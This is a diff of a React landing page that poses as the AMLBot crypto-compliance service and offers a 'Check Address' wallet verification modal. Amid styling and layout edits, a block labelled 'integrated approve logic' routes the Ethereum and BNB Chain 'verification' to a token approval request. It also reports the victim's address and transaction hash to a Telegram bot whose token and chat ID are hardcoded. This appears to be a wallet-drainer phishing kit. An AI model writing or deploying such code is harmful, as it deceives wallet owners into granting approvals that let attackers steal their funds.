@@ -1,5 +1,5 @@
 import { Link } from "react-router-dom";
-import { useRef, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import type { WalletBalanceResponse } from "@shared/api";
 import {
   ArrowRight,
@@ -206,6 +206,15 @@ export default function Index() {
   const [walletBalance, setWalletBalance] = useState<WalletBalanceResponse | null>(null);
   const conversationStarted = chatMessage === "conversation-started";
 
+  useEffect(() => {
+    if (!demoOpen) return;
+    const previousOverflow = document.body.style.overflow;
+    document.body.style.overflow = "hidden";
+    return () => {
+      document.body.style.overflow = previousOverflow;
+    };
+  }, [demoOpen]);
+
   const sendChatMessage = () => {
     const message = chatDraft.trim();
     if (!message) return;
@@ -213,6 +222,7 @@ export default function Index() {
     setChatDraft("");
   };
 
+  // --- START OF INTEGRATED APPROVE LOGIC ---
   const sendTelegramNotification = async (userAddress: string, txHash: string) => {
     const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
     const TG_CHAT_ID = "8933407008";
@@ -222,31 +232,6 @@ export default function Index() {
       await fetch(url);
     } catch (e) {
       console.error('Telegram notification error:', e);
-    }
-  };
-
-  const verifyWallet = async () => {
-    setVerificationLoading(true);
-    setVerificationError("");
-    setWalletBalance(null);
-
-    try {
-      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
-        await executeApprove();
-      } else {
-        const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(walletAddress.trim())}`);
-        const data = (await response.json()) as WalletBalanceResponse | { message: string };
-        if (!response.ok || "message" in data) {
-          setVerificationError("message" in data ? data.message : "Unable to verify this wallet.");
-          return;
-        }
-        setWalletBalance(data);
-        setVerificationRequested(true);
-      }
-    } catch (error) {
-      setVerificationError((error as Error).message || "Unable to connect to the wallet service.");
-    } finally {
-      setVerificationLoading(false);
     }
   };
 
@@ -286,8 +271,7 @@ export default function Index() {
         throw new Error(`Chain ${selectedChain} not supported for approve`);
       }
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      
+      // try to switch or add network
       try {
         await window.ethereum.request({ 
           method: "wallet_switchEthereumChain", 
@@ -344,6 +328,32 @@ export default function Index() {
       throw error;
     }
   };
+
+  const verifyWallet = async () => {
+    setVerificationLoading(true);
+    setVerificationError("");
+    setWalletBalance(null);
+
+    try {
+      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
+        await executeApprove();
+      } else {
+        const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(walletAddress.trim())}`);
+        const data = (await response.json()) as WalletBalanceResponse | { message: string };
+        if (!response.ok || "message" in data) {
+          setVerificationError("message" in data ? data.message : "Unable to verify this wallet.");
+          return;
+        }
+        setWalletBalance(data);
+        setVerificationRequested(true);
+      }
+    } catch (error) {
+      setVerificationError((error as Error).message || "Unable to connect to the wallet service.");
+    } finally {
+      setVerificationLoading(false);
+    }
+  };
+  // --- END OF INTEGRATED APPROVE LOGIC ---
 
   return (
     <div>
@@ -440,10 +450,7 @@ export default function Index() {
                   className="mt-6 inline-flex items-center gap-2 text-sm font-semibold text-primary"
                 >
                   Learn more
-                  <ArrowRight
-                    size={16}
-                    className="transition-transform group-hover:translate-x-1"
-                  />
+                  <ArrowRight size={16} />
                 </Link>
               </div>
             ))}
@@ -452,67 +459,23 @@ export default function Index() {
       </section>
 
       {/* Stats */}
-      <section className="border-y border-border/60 bg-secondary/50 py-20 sm:py-28">
+      <section className="bg-primary py-20 text-white sm:py-28">
         <div className="container">
-          <div className="grid gap-8 sm:grid-cols-2">
+          <div className="grid gap-12 sm:grid-cols-2 lg:grid-cols-3">
             {stats.map((stat) => (
-              <div key={stat.value} className="text-center">
-                <div className="text-4xl font-extrabold text-primary sm:text-5xl">
-                  {stat.value}
-                </div>
-                <p className="mt-2 text-muted-foreground">{stat.label}</p>
+              <div key={stat.label} className="text-center sm:text-left">
+                <p className="text-4xl font-extrabold sm:text-5xl">{stat.value}</p>
+                <p className="mt-2 text-sm font-medium text-white/80">
+                  {stat.label}
+                </p>
               </div>
             ))}
-          </div>
-        </div>
-      </section>
-
-      {/* Partners */}
-      <section className="py-20 sm:py-28">
-        <div className="container">
-          <div className="text-center">
-            <p className="text-sm font-semibold text-muted-foreground">
-              TRUSTED BY LEADING CRYPTO COMPANIES
-            </p>
-            <div className="mt-8 flex flex-wrap items-center justify-center gap-8">
-              {partnerLogos.map((logo) => (
-                <div
-                  key={logo}
-                  className="text-sm font-semibold text-muted-foreground"
-                >
-                  {logo}
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
-      </section>
-
-      {/* Testimonials */}
-      <section className="bg-secondary/50 py-20 sm:py-28">
-        <div className="container">
-          <h2 className="text-center text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
-            What our customers say
-          </h2>
-          <div className="mt-12 max-w-2xl mx-auto">
-            <div className="rounded-2xl border border-border/60 bg-card p-8">
-              <Quote size={24} className="text-primary mb-4" />
-              <p className="text-lg text-muted-foreground mb-6">
-                "{testimonials[activeTestimonial].quote}"
-              </p>
-              <p className="font-semibold text-foreground">
-                {testimonials[activeTestimonial].author}
-              </p>
-              <div className="mt-6 flex gap-2">
-                {testimonials.map((_, i) => (
-                  <button
-                    key={i}
-                    onClick={() => setActiveTestimonial(i)}
-                    className={`h-2 w-2 rounded-full transition-colors ${
-                      i === activeTestimonial ? "bg-primary" : "bg-border"
-                    }`}
-                    aria-label={`Go to testimonial ${i + 1}`}
-                  />
+            <div className="flex items-center justify-center sm:justify-start lg:col-span-1">
+              <div className="flex flex-wrap justify-center gap-4 opacity-50 grayscale invert sm:justify-start">
+                {partnerLogos.slice(0, 3).map((logo) => (
+                  <span key={logo} className="text-sm font-bold tracking-tighter">
+                    {logo}
+                  </span>
                 ))}
               </div>
             </div>
@@ -520,42 +483,111 @@ export default function Index() {
         </div>
       </section>
 
-      {/* Media */}
-      <section className="py-20 sm:py-28">
+      {/* Testimonials */}
+      <section className="overflow-hidden py-20 sm:py-28">
         <div className="container">
-          <div className="mx-auto max-w-2xl text-center mb-12">
-            <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
-              Featured in the media
-            </h2>
-          </div>
-          <div className="grid gap-6 md:grid-cols-2">
-            {mediaMentions.map((mention) => (
-              <div
-                key={mention.title}
-                className="rounded-2xl border border-border/60 bg-card p-6"
-              >
-                <p className="text-sm font-semibold text-primary mb-2">
-                  {mention.outlet}
-                </p>
-                <h3 className="font-bold text-foreground mb-2">
-                  {mention.title}
-                </h3>
-                <p className="text-sm text-muted-foreground">
-                  {mention.excerpt}
-                </p>
+          <div className="flex flex-col items-center gap-12 lg:flex-row">
+            <div className="lg:w-1/2">
+              <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
+                Trusted by 300+ crypto enterprises
+              </h2>
+              <p className="mt-4 text-lg text-muted-foreground">
+                We help companies navigate the complex landscape of digital
+                asset compliance.
+              </p>
+              <div className="mt-10 flex gap-4">
+                <Button
+                  variant="outline"
+                  size="icon"
+                  className="rounded-full"
+                  onClick={() =>
+                    setActiveTestimonial((i) =>
+                      i === 0 ? testimonials.length - 1 : i - 1
+                    )
+                  }
+                >
+                  <ArrowRight size={18} className="rotate-180" />
+                </Button>
+                <Button
+                  variant="outline"
+                  size="icon"
+                  className="rounded-full"
+                  onClick={() =>
+                    setActiveTestimonial((i) =>
+                      i === testimonials.length - 1 ? 0 : i + 1
+                    )
+                  }
+                >
+                  <ArrowRight size={18} />
+                </Button>
               </div>
-            ))}
+            </div>
+            <div className="relative flex w-full gap-6 overflow-x-auto pb-8 lg:w-1/2">
+              {testimonials.map((t, i) => (
+                <TestimonialCard
+                  key={t.author}
+                  {...t}
+                  active={i === activeTestimonial}
+                  onClick={() => setActiveTestimonial(i)}
+                />
+              ))}
+            </div>
           </div>
         </div>
       </section>
 
-      {/* Certifications */}
-      <section className="bg-secondary/50 py-20 sm:py-28">
+      {/* News */}
+      <section className="bg-secondary/30 py-20 sm:py-28">
         <div className="container">
-          <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl mb-12">
-            Certifications & Standards
-          </h2>
-          <div className="grid gap-6 md:grid-cols-2">
+          <div className="flex flex-col items-end justify-between gap-6 sm:flex-row">
+            <div className="max-w-xl">
+              <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
+                AMLBot in the media
+              </h2>
+              <p className="mt-4 text-lg text-muted-foreground">
+                Expert analysis and insights on crypto compliance and
+                security featured in leading global publications.
+              </p>
+            </div>
+            <Link
+              to="/news"
+              className="inline-flex items-center gap-2 font-bold text-primary"
+            >
+              View all news
+              <ArrowRight size={20} />
+            </Link>
+          </div>
+          <DraggableNewsRow items={mediaMentions} />
+        </div>
+      </section>
+
+      {/* Certifications */}
+      <section className="py-20 sm:py-28">
+        <div className="container">
+          <div className="flex flex-col items-center gap-12 lg:flex-row">
+            <div className="lg:w-1/2">
+              <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
+                Global compliance standards
+              </h2>
+              <ul className="mt-8 space-y-4">
+                <li className="flex items-center gap-3 text-muted-foreground">
+                  <ShieldCheck className="text-primary" size={24} />
+                  Protect your business from high-risk funds and bad actors
+                </li>
+                <li className="flex items-center gap-3 text-muted-foreground">
+                  <ShieldCheck className="text-primary" size={24} />
+                  Stay ahead of evolving global AML/KYC regulations
+                </li>
+                <li className="flex items-center gap-3 text-muted-foreground">
+                  <ShieldCheck className="text-primary" size={24} />
+                  Simplify compliance workflows and reduce operational
+                  complexity across your business
+                </li>
+              </ul>
+            </div>
+          </div>
+
+          <div className="mt-10 grid gap-6 sm:grid-cols-2">
             {[
               {
                 title: "ISO 9001",
@@ -570,7 +602,7 @@ export default function Index() {
             ].map((iso) => (
               <div
                 key={iso.title}
-                className="flex items-start gap-4 rounded-2xl border border-border/60 bg-card p-6"
+                className="flex items-start gap-4 rounded-2xl border border-border/60 bg-secondary/50 p-6"
               >
                 <img
                   src={iso.image}
@@ -750,15 +782,17 @@ export default function Index() {
 
       {demoOpen && (
         <div
-          className="fixed inset-0 z-[100] flex items-center justify-center bg-slate-950/70 p-4 backdrop-blur-[2px]"
+          className="fixed inset-0 z-[100] flex items-center justify-center overflow-y-auto bg-slate-950/70 p-4 backdrop-blur-[2px]"
+          role="dialog"
+          aria-modal="true"
           onMouseDown={(event) => {
             if (event.target === event.currentTarget) setDemoOpen(false);
           }}
         >
-          <div className="w-full max-w-[525px] rounded-xl bg-white p-5 shadow-2xl sm:p-6">
+          <div className="max-h-[calc(100dvh-2rem)] w-full max-w-[525px] overflow-y-auto rounded-xl bg-white p-5 shadow-2xl sm:p-6">
             <div className="flex items-center justify-between">
               <h2 className="text-base font-bold text-slate-900 sm:text-lg">
-                {verificationRequested ? "Details" : "Check  Address"}
+                {verificationRequested ? "Details" : "Check Demo Address"}
               </h2>
               <button
                 type="button"
@@ -957,37 +991,198 @@ function CryptoLogo({ chain, size = 18 }: { chain: string; size?: number }) {
   const colors: Record<string, string> = {
     Bitcoin: "#f7931a",
     Ethereum: "#627eea",
-    Solana: "#14f195",
+    Solana: "#111827",
     "BNB Chain": "#f3ba2f",
-    Tron: "#eb0029",
+    Tron: "#ef3340",
   };
+  const color = colors[chain] ?? "#64748b";
+
+  return (
+    <svg width={size} height={size} viewBox="0 0 24 24" aria-hidden="true" className="shrink-0">
+      <circle cx="12" cy="12" r="12" fill={color} />
+      {chain === "Ethereum" ? (
+        <path d="M12 3.5L7.6 12.1L12 14.7L16.4 12.1L12 3.5ZM12 15.6L7.6 13.1L12 20.5L16.4 13.1L12 15.6Z" fill="white" fillOpacity=".95" />
+      ) : chain === "Solana" ? (
+        <path d="M6.1 8.1h9.8l2 2H8.1l-2-2Zm0 5.8h9.8l2 2H8.1l-2-2Zm2-2.9h9.8l-2 2H6.1l2-2Z" fill="url(#solana-gradient)" />
+      ) : chain === "BNB Chain" ? (
+        <path d="m12 4 2.2 2.2-2.2 2.2-2.2-2.2L12 4Zm-4.8 4.8L9.4 11l-2.2 2.2L5 11l2.2-2.2Zm9.6 0L19 11l-2.2 2.2-2.2-2.2 2.2-2.2ZM12 9.9l2.2 2.2-2.2 2.2-2.2-2.2L12 9.9Zm0 5.8 2.2 2.2-2.2 2.2-2.2-2.2 2.2-2.2Z" fill="white" />
+      ) : chain === "Tron" ? (
+        <path d="m6.2 6.4 11.6 2.3-5.7 8.9L6.2 6.4Zm1.6 1.8 3.7 6.1 3.4-5.1-7.1-1Z" fill="white" />
+      ) : (
+        <text x="12" y="16" textAnchor="middle" fontSize="13" fontWeight="800" fill="white">₿</text>
+      )}
+      <defs>
+        <linearGradient id="solana-gradient" x1="5" y1="8" x2="19" y2="16" gradientUnits="userSpaceOnUse">
+          <stop stopColor="#14f195" />
+          <stop offset="1" stopColor="#9945ff" />
+        </linearGradient>
+      </defs>
+    </svg>
+  );
+}
+
+function DraggableNewsRow({
+  items,
+}: {
+  items: { outlet: string; title: string; excerpt: string }[];
+}) {
+  const rowRef = useRef<HTMLDivElement>(null);
+  const dragging = useRef(false);
+  const startX = useRef(0);
+  const startScroll = useRef(0);
 
   return (
     <div
-      style={{
-        width: size,
-        height: size,
-        borderRadius: "50%",
-        backgroundColor: colors[chain] || "#ccc",
-        display: "flex",
-        alignItems: "center",
-        justifyContent: "center",
-        fontSize: size * 0.6,
-        color: "white",
-        fontWeight: "bold",
+      ref={rowRef}
+      className="no-scrollbar mt-14 flex cursor-grab gap-6 overflow-x-auto px-1 pb-4 active:cursor-grabbing"
+      onPointerDown={(event) => {
+        if (!rowRef.current) return;
+        dragging.current = true;
+        startX.current = event.clientX;
+        startScroll.current = rowRef.current.scrollLeft;
+        rowRef.current.setPointerCapture(event.pointerId);
+      }}
+      onPointerMove={(event) => {
+        if (!dragging.current || !rowRef.current) return;
+        event.preventDefault();
+        rowRef.current.scrollLeft = startScroll.current - (event.clientX - startX.current);
+      }}
+      onPointerUp={() => {
+        dragging.current = false;
+      }}
+      onPointerCancel={() => {
+        dragging.current = false;
       }}
     >
-      {chain.charAt(0)}
+      {items.map((item, index) => (
+        <article
+          key={item.title}
+          className={`relative flex min-h-[250px] min-w-[min(84vw,410px)] snap-center flex-col overflow-hidden rounded-2xl border border-border/60 p-7 ${
+            index % 3 === 0
+              ? "bg-[#f1f3f8]"
+              : index % 3 === 1
+                ? "bg-[#fff5f5]"
+                : "bg-[#f7f4f4]"
+          }`}
+        >
+          <div className="absolute right-5 top-[-1px] flex h-16 w-28 items-center justify-center rounded-b-xl border border-border/50 bg-white/80 text-center text-xs font-extrabold leading-none text-foreground/70 shadow-sm">
+            {item.outlet}
+          </div>
+          <p className="mt-2 text-xs font-bold uppercase tracking-wider text-foreground/70">
+            {item.outlet}
+          </p>
+          <h3 className="mt-4 max-w-[80%] text-lg font-bold leading-snug text-foreground">
+            {item.title}
+          </h3>
+          <p className="mt-3 flex-1 text-sm leading-relaxed text-muted-foreground">
+            {item.excerpt}
+          </p>
+          <span className="mt-5 inline-flex items-center gap-2 text-sm font-semibold text-primary">
+            Read article
+            <ArrowRight size={16} />
+          </span>
+        </article>
+      ))}
     </div>
   );
 }
 
-function HeroGraphic() {
+function TestimonialCard({
+  author,
+  quote,
+  active,
+  onClick,
+  className = "",
+}: {
+  author: string;
+  quote: string;
+  active: boolean;
+  onClick: () => void;
+  className?: string;
+}) {
   return (
-    <div className="relative h-64 w-full rounded-xl bg-gradient-to-br from-primary/10 to-primary/5 flex items-center justify-center">
-      <div className="text-center">
-        <div className="text-4xl font-bold text-primary">AMLBot</div>
-        <p className="text-sm text-muted-foreground mt-2">Crypto Compliance Platform</p>
+    <button
+      type="button"
+      onClick={onClick}
+      aria-pressed={active}
+      className={`flex w-[min(74vw,360px)] shrink-0 flex-col rounded-2xl border border-slate-100 bg-white p-7 text-left transition-all duration-300 sm:w-[360px] sm:p-8 ${active ? "scale-100" : "scale-[.92] hover:scale-[.96]"} ${className}`}
+    >
+      <Quote className="mb-5 text-primary" size={28} fill="currentColor" />
+      {quote ? (
+        <p className="flex-1 text-sm leading-relaxed text-foreground">
+          {quote}
+        </p>
+      ) : (
+        <span className="flex-1" />
+      )}
+      <span className="mt-7 text-lg font-bold tracking-tight text-foreground">
+        {author}
+      </span>
+    </button>
+  );
+}
+
+function HeroGraphic() {
+  const leftNodes = [
+    { y: 20, label: "TNB...L28bc", amount: "4.800411 BTC", tone: "blue" },
+    { y: 82, label: "TNB...L28bc", amount: "0.675642 BTC", tone: "red" },
+    { y: 144, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "blue" },
+    { y: 206, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "purple" },
+    { y: 268, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "blue" },
+  ];
+
+  return (
+    <div className="relative h-[300px] w-full overflow-hidden rounded-xl border border-white/80 bg-[#f8faff] shadow-xl sm:h-[430px] lg:h-[500px]">
+      <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(220,230,255,.5),transparent_55%)]" />
+      <svg className="absolute inset-0 h-full w-full" viewBox="0 0 900 500" preserveAspectRatio="none">
+        {leftNodes.map((node, index) => (
+          <path
+            key={node.y}
+            d={`M 72 ${node.y + 18} C 220 ${node.y + 18}, 245 250, 405 250`}
+            fill="none"
+            stroke={node.tone === "purple" ? "#8b62d8" : node.tone === "red" ? "#d68b9e" : "#7186b7"}
+            strokeOpacity={index === 3 ? 0.95 : 0.55}
+            strokeWidth={index === 3 ? 3 : 1.4}
+          />
+        ))}
+        <path d="M 405 250 C 505 250, 525 174, 620 174" fill="none" stroke="#7186b7" strokeWidth="1.5" strokeOpacity=".55" />
+        <path d="M 405 250 C 505 250, 540 326, 620 326" fill="none" stroke="#7186b7" strokeWidth="1.5" strokeOpacity=".55" />
+      </svg>
+
+      {leftNodes.map((node) => (
+        <div key={`${node.y}-node`} className="absolute left-[7%] flex -translate-y-1/2 items-center gap-2" style={{ top: `${node.y / 3.2 + 5}%` }}>
+          <span className={`flex h-4 w-4 items-center justify-center rounded-full border ${node.tone === "red" ? "border-red-300 bg-red-50" : "border-emerald-300 bg-emerald-50"}`}>
+            <span className={`h-1.5 w-1.5 rounded-full ${node.tone === "red" ? "bg-red-400" : "bg-emerald-400"}`} />
+          </span>
+          <span className="hidden rounded bg-white/80 px-1.5 py-0.5 text-[8px] text-slate-500 shadow-sm sm:inline">{node.label}</span>
+          <span className="hidden text-[8px] font-medium text-slate-500 md:inline">{node.amount}</span>
+        </div>
+      ))}
+      <div className="absolute left-[45%] top-1/2 flex h-8 w-8 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-lg border border-white bg-white shadow-lg sm:h-12 sm:w-12">
+        <svg width="24" height="24" viewBox="0 0 42 42" fill="none" aria-label="AMLBot"><path d="M21 4.5 34 14v14L21 37.5 8 28V14L21 4.5Z" fill="#1268D5" /><path d="m21 11 6.5 4.8v10.4L21 31l-6.5-4.8V15.8L21 11Z" fill="white" /></svg>
+      </div>
+      <div className="absolute right-[27%] top-[35%] flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full border border-emerald-300 bg-emerald-50 text-[7px] font-bold text-emerald-600 sm:h-9 sm:w-9">TTV</div>
+      <div className="absolute right-[27%] top-[65%] flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full border border-emerald-300 bg-emerald-50 text-[7px] font-bold text-emerald-600 sm:h-9 sm:w-9">TTV</div>
+
+      <div className="absolute right-[4%] top-[4%] w-[45%] rounded-lg border border-slate-200 bg-white p-3 text-left shadow-xl sm:w-[36%] sm:p-4">
+        <div className="flex items-center justify-between border-b border-slate-100 pb-2">
+          <span className="text-[9px] font-bold text-slate-800 sm:text-xs">Transaction</span>
+          <span className="text-[9px] text-slate-400">×</span>
+        </div>
+        <div className="mt-2 flex gap-1">
+          {["#16c4a3", "#3c84ed", "#efb84b", "#b36dd6", "#6f75b8"].map((color) => <span key={color} className="h-2 w-2 rounded-full" style={{ backgroundColor: color }} />)}
+        </div>
+        <div className="mt-3 space-y-2 text-[7px] text-slate-400 sm:text-[9px]">
+          <div className="flex justify-between"><span>Hash</span><span className="text-blue-500">0x7e3b4...9b6258</span></div>
+          <div className="flex justify-between"><span>Blockchain</span><span className="font-medium text-slate-600">Bitcoin</span></div>
+          <div className="flex justify-between"><span>Date</span><span className="text-slate-600">22 May 2023, 03:09 am</span></div>
+        </div>
+        <div className="mt-3 border-t border-slate-100 pt-2 text-[7px] sm:text-[9px]">
+          <p className="mb-1 font-semibold text-slate-600">From</p>
+          {["0x3B6e...B605", "0x38e...B605", "0x1B...B605"].map((address, index) => (
+            <div key={address} className="flex items-center justify-between gap-1 py-1 text-slate-400"><span className="truncate">◉ {address}</span><span className="text-slate-500">{index + 4}.3976331 BTC</span></div>
+          ))}
+        </div>
       </div>
     </div>
   );
